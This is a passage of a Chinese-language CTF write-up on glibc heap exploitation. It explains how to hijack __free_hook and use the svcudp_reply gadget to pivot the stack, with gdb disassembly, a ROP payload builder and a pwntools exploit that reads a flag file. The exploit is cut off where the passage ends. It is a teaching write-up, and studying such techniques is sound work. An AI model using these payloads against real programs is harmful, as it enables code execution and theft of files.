+   <span class="mh">0x7fa90f6fef3a</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">26</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rbp</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">]</span>
+   <span class="mh">0x7fa90f6fef3e</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">30</span><span class="o">&gt;</span>     <span class="n">lea</span>    <span class="n">r12</span><span class="p">,</span> <span class="p">[</span><span class="n">rbp</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">]</span>
+   <span class="mh">0x7fa90f6fef42</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">34</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rbp</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">],</span> <span class="mi">0</span>
+   <span class="mh">0x7fa90f6fef49</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">41</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">rdi</span><span class="p">,</span> <span class="n">r12</span>
+   <span class="mh">0x7fa90f6fef4c</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">44</span><span class="o">&gt;</span>     <span class="n">call</span>   <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rax</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">]</span>
+   <span class="mh">0x7fa90f6fef4f</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">47</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rbp</span> <span class="o">+</span> <span class="mi">8</span><span class="p">]</span>
+   <span class="mh">0x7fa90f6fef53</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">51</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">rsi</span><span class="p">,</span> <span class="n">r13</span>
+   <span class="mh">0x7fa90f6fef56</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">54</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">rdi</span><span class="p">,</span> <span class="n">r12</span>
+   <span class="mh">0x7fa90f6fef59</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">57</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">r13</span><span class="p">],</span> <span class="n">rax</span>
+   <span class="mh">0x7fa90f6fef5d</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">61</span><span class="o">&gt;</span>     <span class="n">call</span>   <span class="n">xdr_replymsg</span><span class="nd">@GLIBC_2.2.5</span>    <span class="o">&lt;</span><span class="n">xdr_replymsg</span><span class="nd">@GLIBC_2.2.5</span><span class="o">&gt;</span>
+
+   <span class="mh">0x7fa90f6fef62</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">66</span><span class="o">&gt;</span>     <span class="n">test</span>   <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
+   <span class="mh">0x7fa90f6fef64</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">68</span><span class="o">&gt;</span>     <span class="n">je</span>     <span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">128</span>            <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">128</span><span class="o">&gt;</span>
+
+   <span class="mh">0x7fa90f6fef66</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">70</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rbp</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">]</span>
+   <span class="mh">0x7fa90f6fef6a</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">74</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">rdi</span><span class="p">,</span> <span class="n">r12</span>
+   <span class="mh">0x7fa90f6fef6d</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">77</span><span class="o">&gt;</span>     <span class="n">call</span>   <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rax</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">]</span>
+   <span class="mh">0x7fa90f6fef70</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">80</span><span class="o">&gt;</span>     <span class="nb">cmp</span>    <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rbx</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">],</span> <span class="mi">0</span>
+   <span class="mh">0x7fa90f6fef75</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">85</span><span class="o">&gt;</span>     <span class="n">movsxd</span> <span class="n">r12</span><span class="p">,</span> <span class="n">eax</span>
+   <span class="mh">0x7fa90f6fef78</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">88</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">r13</span><span class="p">,</span> <span class="n">r12</span>
+   <span class="mh">0x7fa90f6fef7b</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">91</span><span class="o">&gt;</span>     <span class="n">jne</span>    <span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">152</span>            <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">152</span><span class="o">&gt;</span>
+
+   <span class="mh">0x7fa90f6fef7d</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">93</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">rsi</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rbx</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">]</span>
+   <span class="mh">0x7fa90f6fef81</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">97</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">r9d</span><span class="p">,</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rbx</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">]</span>
+   <span class="mh">0x7fa90f6fef85</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">101</span><span class="o">&gt;</span>    <span class="n">xor</span>    <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>                        <span class="n">ECX</span> <span class="o">=&gt;</span> <span class="mi">0</span>
+   <span class="mh">0x7fa90f6fef87</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">103</span><span class="o">&gt;</span>    <span class="n">lea</span>    <span class="n">r8</span><span class="p">,</span> <span class="p">[</span><span class="n">rbx</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">]</span>
+   <span class="mh">0x7fa90f6fef8b</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">107</span><span class="o">&gt;</span>    <span class="n">mov</span>    <span class="n">edi</span><span class="p">,</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rbx</span><span class="p">]</span>
+   <span class="mh">0x7fa90f6fef8d</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">109</span><span class="o">&gt;</span>    <span class="n">nop</span>
+   <span class="mh">0x7fa90f6fef8e</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">110</span><span class="o">&gt;</span>    <span class="n">mov</span>    <span class="n">rdx</span><span class="p">,</span> <span class="n">r12</span>
+   <span class="mh">0x7fa90f6fef91</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">113</span><span class="o">&gt;</span>    <span class="n">call</span>   <span class="n">sendto</span>                      <span class="o">&lt;</span><span class="n">sendto</span><span class="o">&gt;</span>
+
+   <span class="mh">0x7fa90f6fef96</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">118</span><span class="o">&gt;</span>    <span class="nb">cmp</span>    <span class="n">eax</span><span class="p">,</span> <span class="n">r13d</span>
+   <span class="mh">0x7fa90f6fef99</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">121</span><span class="o">&gt;</span>    <span class="n">je</span>     <span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">183</span>            <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">183</span><span class="o">&gt;</span>
+
+   <span class="mh">0x7fa90f6fef9b</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">123</span><span class="o">&gt;</span>    <span class="n">nop</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rax</span> <span class="o">+</span> <span class="n">rax</span><span class="p">]</span>
+   <span class="mh">0x7fa90f6fefa0</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">128</span><span class="o">&gt;</span>    <span class="n">xor</span>    <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>                        <span class="n">EAX</span> <span class="o">=&gt;</span> <span class="mi">0</span>
+   <span class="mh">0x7fa90f6fefa2</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">130</span><span class="o">&gt;</span>    <span class="n">add</span>    <span class="n">rsp</span><span class="p">,</span> <span class="mh">0x18</span>
+   <span class="mh">0x7fa90f6fefa6</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">134</span><span class="o">&gt;</span>    <span class="n">pop</span>    <span class="n">rbp</span>
+   <span class="mh">0x7fa90f6fefa7</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">135</span><span class="o">&gt;</span>    <span class="n">pop</span>    <span class="n">rbx</span>
+   <span class="mh">0x7fa90f6fefa8</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">136</span><span class="o">&gt;</span>    <span class="n">pop</span>    <span class="n">r12</span>
+   <span class="mh">0x7fa90f6fefaa</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">138</span><span class="o">&gt;</span>    <span class="n">pop</span>    <span class="n">r13</span>
+   <span class="mh">0x7fa90f6fefac</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">140</span><span class="o">&gt;</span>    <span class="n">pop</span>    <span class="n">r14</span>
+   <span class="mh">0x7fa90f6fefae</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">142</span><span class="o">&gt;</span>    <span class="n">pop</span>    <span class="n">r15</span>
+   <span class="mh">0x7fa90f6fefb0</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">144</span><span class="o">&gt;</span>    <span class="n">ret</span>
+</pre></div>
+<p>这里没有放完，我们需要注意的就是从+22一直到+44的这几个gadget，它同样可以同时完成程序执行流劫持和栈迁移</p>
+<p>这个 gadget 在不同的 libc 中使用的寄存器不同，具体视情况而定。比如有的 libc 使用的是 rbx 而不是 rbp 导致无法栈迁移实现对程序执行流程的连续劫持。</p>
+<p>利用这个gadget，通过<code>rdi</code>控制<code>rbp</code>进而控制<code>rax</code>并执行跳转,只需要在<code>rax + 0x28</code>的位置设置<code>leave; ret</code>即可完成栈迁移.</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241005193232-8306d6d2-830d-1.png"/></p>
+<p>我们直接从free_hook劫持成功开始写，看看怎么利用</p>
+<p>由于这个部分只起到栈迁移的作用，所以我们的payload是包含orw三个部分</p>
+<div class="highlight"><pre><span></span><span class="n">payload_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">]</span>
+<span class="n">buf_addr</span> <span class="o">=</span> <span class="n">payload_addr</span> <span class="o">+</span> <span class="mh">0x100</span>
+<span class="n">rax_addr</span> <span class="o">=</span> <span class="n">payload_addr</span> <span class="o">+</span> <span class="mh">0xb0</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">''</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'svcudp_reply'</span><span class="p">]</span> <span class="o">+</span> <span class="mi">22</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'pop r14; pop r15; ret;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'a'</span> <span class="o">*</span> <span class="mi">8</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rax_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'pop rdi; ret;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'pop rsi; ret;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'open'</span><span class="p">])</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'pop rdi; ret;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'pop rsi; ret;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'pop rdx; ret;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'read'</span><span class="p">])</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'pop rdi; ret;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'puts'</span><span class="p">])</span>
+<span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="n">rax_addr</span> <span class="o">-</span> <span class="n">payload_addr</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">rax_addr</span> <span class="o">-</span> <span class="n">payload_addr</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'b'</span> <span class="o">*</span> <span class="mh">0x28</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'leave; ret;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"./flag</span><span class="se">\x00</span><span class="s2">"</span>
+
+<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'c'</span> <span class="o">*</span> <span class="mh">0x48</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">]))</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</pre></div>
+<p>我们先放好exp，然后gdb动态调试告诉大家为什么这么写</p>
+<p>把payload放进free_hook之后，我们会先跳转到svcudp_reply+22这个位置</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241005193253-8f8da41c-830d-1.png"/></p>
+<p>那么这个时候，会把rdi+0x48的位置取出来给到rbp，而我们rdi指向的是1号堆块，也就是edit(1, b'c' * 0x48 + p64(libc.sym['__free_hook']))这一句，加0x48的位置就是我们的free_hook地址</p>
+<div class="highlight"><pre><span></span><span class="o">*</span><span class="n">RBP</span>  <span class="mh">0x7fa90f993e48</span> <span class="p">(</span><span class="n">__free_hook</span><span class="p">)</span> <span class="err">—▸</span> <span class="mh">0x7fa90f6fef36</span> <span class="p">(</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">22</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">]</span>
+</pre></div>
+<p>可以看到，此时的栈底就被放在了free_hook的位置，然后执行mov    rax, qword ptr [rbp + 0x18]，这个时候的rbp就是free_hook，加上0x18刚好是我们payload中的那句p64(rax_addr)，随后执行call   qword ptr [rax + 0x28]，也就是执行rax_addr+0x28的位置，而这个位置其实就是payload里面28个b之后的leave ret语句</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241005193311-9a537ae8-830d-1.png"/></p>
+<p>然后就会进行栈迁移，迁移到我们的payload的第二句，而这里面要放上两句pop，随意寄存器都可以，目的是为了把后面的8个字节的垃圾数据和rax_addr给弹出栈，防止后续的执行，再后面就会依次执行orw，最后成功获得flag</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241005193327-a3a0b782-830d-1.png"/></p>
+<p>最后附上完整的exp</p>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">'debug'</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">'amd64'</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">'linux'</span><span class="p">)</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./pwn"</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"libc.so.6"</span><span class="p">)</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">"/home/gets/pwn/study/heap/setcontext/svcudp_reply/ld-linux-x86-64.so.2"</span><span class="p">,</span> <span class="s2">"./pwn"</span><span class="p">],</span>
+            <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s2">"LD_PRELOAD"</span><span class="p">:</span><span class="s2">"/home/gets/pwn/study/heap/setcontext/svcudp_reply/libc.so.6"</span><span class="p">})</span>
+
+<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"choice:"</span><span class="p">,</span> <span class="s2">"1"</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"index:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"size:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>    
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"choice:"</span><span class="p">,</span> <span class="s2">"2"</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"index:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"choice:"</span><span class="p">,</span> <span class="s2">"3"</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"index:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"length:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"content:"</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"choice:"</span><span class="p">,</span> <span class="s2">"4"</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"index:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">)</span>
+
+<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'</span><span class="se">\x7F</span><span class="s1">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x3b6be0</span>
+<span class="n">info</span><span class="p">(</span><span class="s2">"libc base: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+
+<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">]))</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span><span class="c1">#free_hook</span>
+
+<span class="n">payload_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">]</span>
+<span class="n">buf_addr</span> <span class="o">=</span> <span class="n">payload_addr</span> <span class="o">+</span> <span class="mh">0x100</span>
+<span class="n">rax_addr</span> <span class="o">=</span> <span class="n">payload_addr</span> <span class="o">+</span> <span class="mh">0xb0</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">''</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'svcudp_reply'</span><span class="p">]</span> <span class="o">+</span> <span class="mi">22</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'pop r14; pop r15; ret;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'a'</span> <span class="o">*</span> <span class="mi">8</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rax_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'pop rdi; ret;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>
